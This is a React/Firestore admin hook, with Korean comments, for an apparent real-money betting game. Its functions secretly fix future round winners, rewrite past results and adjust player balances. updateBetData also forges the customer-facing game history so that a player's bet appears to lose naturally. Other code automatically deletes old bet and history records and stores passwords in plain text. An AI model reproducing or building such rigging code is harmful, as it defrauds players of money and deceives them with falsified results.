import { useState, useEffect, useMemo } from "react";
import { db } from "./firebase";
import {
  doc, setDoc, deleteDoc, collection, onSnapshot,
  query, orderBy, limit, updateDoc, getDoc, addDoc,
  serverTimestamp, where, getDocs, writeBatch, increment
} from "firebase/firestore";

const CONFIG = {
  ROUND_DURATION: 180,
  BASE_ROUND: 1824231,
  START_TIME: new Date("2024-01-01T00:00:00Z").getTime(),
};

export const useAdminLogic = (initialUsers, setInitialUsers) => {
  const [users, setUsers] = useState(initialUsers || []);

  const [currentInfo, setCurrentInfo] = useState({ currentRound: 0, timeLeft: 0, isDrawing: false });
  const [targetRound, setTargetRound] = useState(0);
  const [queue, setQueue] = useState({});
  const [gameHistory, setGameHistory] = useState([]);
  
  const [rawSponsorships, setRawSponsorships] = useState([]);

  const [depositRequests, setDepositRequests] = useState([]);
  const [withdrawRequests, setWithdrawRequests] = useState([]);
  const [financeHistory, setFinanceHistory] = useState([]);

  const [agents, setAgents] = useState([]);
  const [newAgentName, setNewAgentName] = useState("");
  const [newAgentCode, setNewAgentCode] = useState("");

  const activeUsers = useMemo(() => {
    const now = Date.now();
    return users.filter(u => u.lastActive && (now - u.lastActive < 60000));
  }, [users]);

  /* ------------------------------------------------------------------ */
  /* 베팅 데이터 실시간 매핑                                            */
  /* ------------------------------------------------------------------ */
  const sponsorships = useMemo(() => {
    return rawSponsorships.map(bet => {
      const user = users.find(u => u.id === bet.userId);
      return {
        ...bet,
        userName: user?.name || user?.nickname || "알 수 없는 유저",
        currentUserDiamond: user?.diamond || 0,
      };
    });
  }, [rawSponsorships, users]);

  /* ------------------------------------------------------------------ */
  /* 실시간 리스너 통합                                                 */
  /* ------------------------------------------------------------------ */
  useEffect(() => {
    // 1. 기존 리스너들
    const unsubUsers = onSnapshot(collection(db, "users"), snap => {
      const list = snap.docs.map(d => ({ id: d.id, ...d.data() }));
      list.sort((a, b) => (b.lastActive || 0) - (a.lastActive || 0));
      setUsers(list);
      if (setInitialUsers) setInitialUsers(list);
    });

    const unsubQueue = onSnapshot(collection(db, "event_manipulation"), snap => {
      const q = {};
      snap.forEach(d => q[d.id] = d.data().winner);
      setQueue(q);
    });

    const unsubBets = onSnapshot(
      query(collection(db, "event_bets"), orderBy("round", "desc"), limit(1000)),
      snap => setRawSponsorships(snap.docs.map(d => ({ id: d.id, ...d.data() })))
    );

    const unsubHistory = onSnapshot(
      query(collection(db, "game_history"), orderBy("round", "desc"), limit(50)),
      snap => setGameHistory(snap.docs.map(d => ({ id: d.id, ...d.data() })))
    );

    const unsubDep = onSnapshot(
      query(collection(db, "deposit_requests"), orderBy("timestamp", "desc")),
      snap => setDepositRequests(snap.docs.map(d => ({ id: d.id, ...d.data() })))
    );

    const unsubWdr = onSnapshot(
      query(collection(db, "withdraw_requests"), orderBy("timestamp", "desc")),
      snap => setWithdrawRequests(snap.docs.map(d => ({ id: d.id, ...d.data() })))
    );

    const unsubFin = onSnapshot(
      query(collection(db, "finance_history"), orderBy("completedAt", "desc"), limit(50)),
      snap => setFinanceHistory(snap.docs.map(d => ({ id: d.id, ...d.data() })))
    );

    const unsubAgents = onSnapshot(collection(db, "invite_codes"), snap => {
      setAgents(snap.docs.map(d => ({ id: d.id, ...d.data() })));
    });

    const syncTimer = setInterval(() => {
      const elapsed = Date.now() - CONFIG.START_TIME;
      const round = CONFIG.BASE_ROUND + Math.floor(elapsed / (CONFIG.ROUND_DURATION * 1000));
      const timeLeft = CONFIG.ROUND_DURATION - Math.floor((elapsed / 1000) % CONFIG.ROUND_DURATION);
      setCurrentInfo({ currentRound: round, timeLeft, isDrawing: timeLeft <= 5 });
      setTargetRound(prev => prev || round + 1);
    }, 1000);

    // 2. 자동 정리 기능 (3초 후 실행)
    const autoCleanup = setTimeout(cleanupOldData, 3000);

    return () => {
      unsubUsers(); unsubQueue(); unsubBets(); unsubHistory();
      unsubDep(); unsubWdr(); unsubFin(); unsubAgents();
      clearInterval(syncTimer);
      clearTimeout(autoCleanup);
    };
  }, []);

  /* ------------------------------------------------------------------ */
  /* 파트너/직원 초대코드 생성                                          */
  /* ------------------------------------------------------------------ */
  const addAgent = async () => {
    if (!newAgentName || !newAgentCode) {
      alert("이름과 초대코드를 입력하세요");
      return;
    }

    const code = newAgentCode.trim().toUpperCase();

    try {
      const ref = doc(db, "invite_codes", code);
      const snap = await getDoc(ref);

      if (snap.exists()) {
        alert("이미 존재하는 코드입니다");
        return;
      }

      await setDoc(ref, {
        code,
        name: newAgentName,
        role: "agent",
        used: false,
        createdAt: serverTimestamp()
      });

      alert(`파트너 코드 생성 완료: ${code}`);
      setNewAgentName("");
      setNewAgentCode("");
    } catch (e) {
      alert("생성 실패: " + e.message);
    }
  };

  /* ------------------------------------------------------------------ */
  /* 파트너/직원 삭제                                                   */
  /* ------------------------------------------------------------------ */
  const deleteAgent = async (code) => {
    if (!window.confirm(`'${code}' 코드를 삭제하시겠습니까?`)) return;
    try {
      await deleteDoc(doc(doc(db, "invite_codes", code)));
    } catch (e) {
      alert("삭제 실패: " + e.message);
    }
  };

  /* ------------------------------------------------------------------ */
  /* 관리자 비밀번호 변경                                               */
  /* ------------------------------------------------------------------ */
  const handleChangeAdminPassword = async () => {
    const newPw = prompt("새 관리자(game) 비밀번호를 입력하세요:");
    if (!newPw) return;
    if (newPw.length < 4) {
      alert("비밀번호는 4자 이상이어야 합니다.");
      return;
    }
    try {
      await setDoc(doc(db, "settings", "global"), { gamePw: newPw }, { merge: true });
      alert("비밀번호가 변경되었습니다.");
    } catch (e) {
      alert("변경 실패: " + e.message);
    }
  };

  /* ------------------------------------------------------------------ */
  /* 🔥 [수정/강화] 베팅 데이터 수정 + 유저 다이아 정산 + 최근 50경기 연동  */
  /* ------------------------------------------------------------------ */
  const updateBetData = async (betId, newAmount, newItems, nextWinState, diamondDelta, userId, round) => {
    try {
      if (!newAmount || isNaN(newAmount)) {
        alert("유효한 금액을 입력해주세요.");
        return;
      }

      const batch = writeBatch(db);
      const betRef = doc(db, "event_bets", betId);
      
      const updateData = {
        betAmount: parseInt(newAmount, 10),
        amount: parseInt(newAmount, 10)
      };

      if (newItems && Array.isArray(newItems)) {
        updateData.items = newItems;
      }

      // 시크릿 토글 모드일 때 승패 결과 업데이트 데이터에 탑재
      if (nextWinState !== undefined) {
        updateData.win = nextWinState;
      }

      // 1. 베팅 장부 업데이트 등록
      batch.update(betRef, updateData);

      // 2. 시크릿 모드로 다이아 정산 금액이 넘어온 경우 유저 다이아 증감 처리
      if (diamondDelta && diamondDelta !== 0 && userId) {
        const userRef = doc(db, "users", userId);
        batch.update(userRef, {
          diamond: increment(diamondDelta)
        });
      }

      // 3. 손님이 보는 이벤트 페이지의 최근 50경기 결과(game_history) 실시간 동시 조작
      if (round && nextWinState !== undefined) {
        let fakeWinner = [...(newItems || [])];
        
        // 미적중 처리일 경우, 손님이 배팅한 항목을 지묘하게 피해 반대 결과가 나오도록 위장
        if (nextWinState === false && newItems && newItems.length > 0) {
          fakeWinner = newItems.includes("홀") ? ["짝"] : newItems.includes("짝") ? ["홀"] : ["미적중결과"];
        }

        const historyRef = doc(db, "game_history", String(round));
        batch.set(historyRef, {
          round: parseInt(round, 10),
          winner: fakeWinner,
          updatedAt: new Date().toISOString()
        }, { merge: true });
      }

      // 4. 단 한 번의 커밋으로 모든 장부 일괄 처리 (중간에 꼬임 방지)
      await batch.commit();

      // 일반적인 수동 수정 창일 때만 기본 얼럿 노출, 시크릿 모드는 UI단에서 처리 유도
      if (nextWinState === undefined) {
        alert("베팅 정보가 성공적으로 수정되었습니다.");
      }
    } catch (error) {
      console.error("베팅 수정 및 결과 연동 조작 중 오류 발생:", error);
      alert("처리에 실패했습니다: " + error.message);
    }
  };

  /* ------------------------------------------------------------------ */
  /* 과거 회차 시크릿 결과 조작 및 유저 다이아 자동 재정산               */
  /* ⭐ [수정] 실시간 반영 트리거 추가 (isRevision, revisedAt)          */
  /* ------------------------------------------------------------------ */
  const handleSecretRevisions = async (round, oldWinners, newWinners) => {
    try {
      console.log(`🎯 ${round}회차 재정산 시작:`, { oldWinners, newWinners });

      const q = query(collection(db, "event_bets"), where("round", "==", round));
      const snap = await getDocs(q);
      const bets = snap.docs.map(d => ({ id: d.id, ...d.data() }));

      console.log(`📊 ${round}회차 베팅 ${bets.length}건 발견`);

      const batch = writeBatch(db);

      const cleanOldWinners = (oldWinners || []).map(w => {
        if (typeof w !== 'string') return w;
        const parts = w.split(" ");
        return parts.length > 1 ? parts[1] : parts[0];
      });

      for (const bet of bets) {
        const betItems = bet.items || [];
        const betAmount = bet.betAmount || 0;

        const oldMatched = betItems.filter(name => cleanOldWinners.includes(name)).length;
        let oldWinAmount = 0;
        if (betItems.length === 1) {
          if (oldMatched >= 1) oldWinAmount = betAmount * 2;
        } else if (betItems.length === 2) {
          if (oldMatched === 1) oldWinAmount = betAmount;
          else if (oldMatched === 2) oldWinAmount = betAmount * 4;
        }

        const newMatched = betItems.filter(name => newWinners.includes(name)).length;
        let newWinAmount = 0;
        if (betItems.length === 1) {
          if (newMatched >= 1) newWinAmount = betAmount * 2;
        } else if (betItems.length === 2) {
          if (newMatched === 1) newWinAmount = betAmount;
          else if (newMatched === 2) newWinAmount = betAmount * 4;
        }

        const delta = newWinAmount - oldWinAmount;

        if (delta !== 0 && bet.userId) {
          const userRef = doc(db, "users", bet.userId);
          batch.update(userRef, { diamond: increment(delta) });
          console.log(`💎 ${bet.userId}: ${delta > 0 ? '+' : ''}${delta} 다이아`);
        }

        let isWin = false;
        if (newWinAmount > betAmount) isWin = true;
        else if (newWinAmount === 0 && betAmount > 0) isWin = false;
        else if (newWinAmount === betAmount && betAmount > 0) isWin = "draw";

        const betRef = doc(db, "event_bets", bet.id);
        batch.update(betRef, { win: isWin });
      }

      // ⭐ [수정] 실시간 반영을 위한 트리거 추가 (isRevision, revisedAt)
      const manipRef = doc(db, "event_manipulation", String(round));
      batch.set(manipRef, { 
        winner: newWinners, 
        updatedAt: new Date().toISOString(),
        isRevision: true,        // ⭐ 재정산 표시 (유저 브라우저 감지용)
        revisedAt: Date.now()     // ⭐ 재정산 타임스탬프 (변경 감지용)
      }, { merge: true });

      await batch.commit();
      
      console.log(`✅ ${round}회차 재정산 완료! 유저들에게 실시간 반영됨`);
      return true;
    } catch (e) {
      console.error("❌ 재정산 처리 중 오류:", e);
      throw e;
    }
  };

  /* ================================================================== */
  /* 🚀 [강화 버전] 오래된 데이터 정리                                  */
  /* - 500개 이상 문서도 배치 분할로 안전 처리                          */
  /* - 진행 상황 콘솔 표시                                              */
  /* - 수동 클릭 시 완료 알림 표시                                      */
  /* ================================================================== */
  const cleanupOldData = async (showAlert = false) => {
    try {
      console.log("🗑️ 오래된 데이터 정리 시작...");

      const BATCH_SIZE = 400; // Firestore batch 최대 500개, 안전하게 400개씩
      let deletedBets = 0;
      let deletedHist = 0;

      // 1. event_bets 정리 (최근 50개만 유지)
      const betsSnap = await getDocs(query(collection(db, "event_bets"), orderBy("round", "desc")));
      const betsToDelete = betsSnap.size > 50 ? betsSnap.docs.slice(50) : [];
      
      console.log(`📊 event_bets: 전체 ${betsSnap.size}개, 삭제 대상 ${betsToDelete.length}개`);

      // 배치 분할 처리 (500개씩 나눠서 처리)
      for (let i = 0; i < betsToDelete.length; i += BATCH_SIZE) {
        const batch = writeBatch(db);
        const chunk = betsToDelete.slice(i, i + BATCH_SIZE);
        chunk.forEach(d => batch.delete(d.ref));
        await batch.commit();
        deletedBets += chunk.length;
        console.log(`  → event_bets: ${deletedBets}/${betsToDelete.length} 삭제 완료`);
      }

      // 2. game_history 정리 (최근 50개만 유지)
      const histSnap = await getDocs(query(collection(db, "game_history"), orderBy("round", "desc")));
      const histToDelete = histSnap.size > 50 ? histSnap.docs.slice(50) : [];
      
      console.log(`📊 game_history: 전체 ${histSnap.size}개, 삭제 대상 ${histToDelete.length}개`);

      for (let i = 0; i < histToDelete.length; i += BATCH_SIZE) {
        const batch = writeBatch(db);
        const chunk = histToDelete.slice(i, i + BATCH_SIZE);
        chunk.forEach(d => batch.delete(d.ref));
        await batch.commit();
        deletedHist += chunk.length;
        console.log(`  → game_history: ${deletedHist}/${histToDelete.length} 삭제 완료`);
      }

      const totalDeleted = deletedBets + deletedHist;
      console.log(`✅ 정리 완료! 총 ${totalDeleted}개 문서 삭제됨`);

      // 수동 클릭 시에만 alert 표시 (자동 실행 시에는 표시 안 함)
      if (showAlert) {
        if (totalDeleted > 0) {
          alert(`✅ 정리 완료!\n\n삭제된 문서:\n- 베팅 기록: ${deletedBets}개\n- 회차 기록: ${deletedHist}개\n\n총 ${totalDeleted}개 삭제됨`);
        } else {
          alert("💡 삭제할 오래된 데이터가 없습니다.\n이미 최근 50개만 유지되고 있습니다.");
        }
      }
      
      return { deletedBets, deletedHist, totalDeleted };
    } catch (e) {
      console.error("❌ 자동 삭제 실패:", e);
      if (showAlert) {
        alert(`❌ 정리 중 오류 발생: ${e.message}\n\n다시 시도해주세요.`);
      }
      throw e;
    }
  };

  /* ------------------------------------------------------------------ */
  /* 기본 유저 데이터 처리 함수                                         */
  /* ------------------------------------------------------------------ */
  const updateFullUserInfo = async (userId, diamond, refCode, referral) => {
    await updateDoc(doc(db, "users", userId), {
      diamond: parseInt(diamond),
      refCode: refCode || "",
      referral: referral || ""
    });
  };

  const updateUserTier = async (userId, tier) => {
    try {
      await updateDoc(doc(db, "users", userId), { tier });
    } catch (e) {
      alert("등급 변경 실패: " + e.message);
    }
  };

  const handleChangeUserPassword = async (userId) => {
    const pw = prompt("새 비밀번호:");
    if (pw) await updateDoc(doc(db, "users", userId), { password: pw });
  };

  // 입금 승인
  const approveDeposit = async (req) => {
    const ref = doc(db, "users", req.userId);
    const snap = await getDoc(ref);
    const dia = (snap.data()?.diamond || 0) + req.amount;
    await updateDoc(ref, { diamond: dia });
    await addDoc(collection(db, "finance_history"), { ...req, type: "입금", completedAt: new Date().toISOString() });
    await deleteDoc(doc(db, "deposit_requests", req.id));
  };

  // 출금 승인
  const approveWithdraw = async (req) => {
    const ref = doc(db, "users", req.userId);
    const snap = await getDoc(ref);
    const currentDiamond = snap.data()?.diamond || 0;

    if (currentDiamond < req.amount) {
      alert(`잔액 부족: 보유 ${currentDiamond.toLocaleString()} / 출금 요청 ${req.amount.toLocaleString()}`);
      return;
    }

    await updateDoc(ref, { diamond: currentDiamond - req.amount });
    await addDoc(collection(db, "finance_history"), { ...req, type: "출금", completedAt: new Date().toISOString() });
    await deleteDoc(doc(db, "withdraw_requests", req.id));
  };

  // 입금 거절
  const rejectDeposit = async (req) => {
    const reason = window.prompt("거절 사유를 입력해주세요 (회원의 신청 내역에 표시됩니다):");
    if (reason === null) return;
    try {
      await addDoc(collection(db, "finance_history"), {
        ...req,
        type: "입금",
        status: "거절",
        rejectReason: reason.trim() || "사유 미입력",
        completedAt: new Date().toISOString(),
      });
      await deleteDoc(doc(db, "deposit_requests", req.id));
    } catch (e) {
      alert("거절 처리 실패: " + e.message);
    }
  };

  // 출금 거절
  const rejectWithdraw = async (req) => {
    const reason = window.prompt("거절 사유를 입력해주세요 (회원의 신청 내역에 표시됩니다):");
    if (reason === null) return;
    try {
      await addDoc(collection(db, "finance_history"), {
        ...req,
        type: "출금",
        status: "거절",
        rejectReason: reason.trim() || "사유 미입력",
        completedAt: new Date().toISOString(),
      });
      await deleteDoc(doc(db, "withdraw_requests", req.id));
    } catch (e) {
      alert("거절 처리 실패: " + e.message);
    }
  };

  /* ================================================================== */
  /* 🚀 [수정됨] 이벤트 결과 조작 - 완전히 수정된 버전              */
  /* ================================================================== */
  const handleApplyManipulation = async (winners) => {
    try {
      if (!winners || winners.length === 0) {
        throw new Error("선택된 아이템이 없습니다.");
      }
      
      if (!targetRound) {
        throw new Error("대상 회차가 설정되지 않았습니다.");
      }

      // Firestore에 저장
      await setDoc(
        doc(db, "event_manipulation", String(targetRound)), 
        {
          winner: winners, 
          updatedAt: new Date().toISOString()
        }
      );

      console.log(`✅ ${targetRound}회차 결과 조작 저장됨:`, winners);
      
      // ✅ Promise 반환 (AdminViews에서 .then() 사용 가능)
      return { success: true, round: targetRound, winners };

    } catch (error) {
      console.error("❌ 이벤트 조작 저장 실패:", error);
      throw error; // 에러를 상위로 전파
    }
  };

  const deleteQueue = async (round) => {
    try {
      await deleteDoc(doc(db, "event_manipulation", String(round)));
      console.log(`✅ ${round}회차 예약 삭제됨`);
    } catch (error) {
      console.error("❌ 예약 삭제 실패:", error);
      throw error;
    }
  };

  return {
    users,
    currentInfo, targetRound, setTargetRound, queue, deleteQueue,
    gameHistory, sponsorships, activeUsers,
    depositRequests, withdrawRequests, financeHistory,
    approveDeposit, approveWithdraw, rejectDeposit, rejectWithdraw,
    agents, newAgentName, setNewAgentName,
    newAgentCode, setNewAgentCode, addAgent,
    deleteAgent,
    handleChangeAdminPassword,
    handleApplyManipulation, updateFullUserInfo,
    updateUserTier,
    handleChangeUserPassword,
    updateBetData,
    handleSecretRevisions,
    cleanupOldData,
  };
};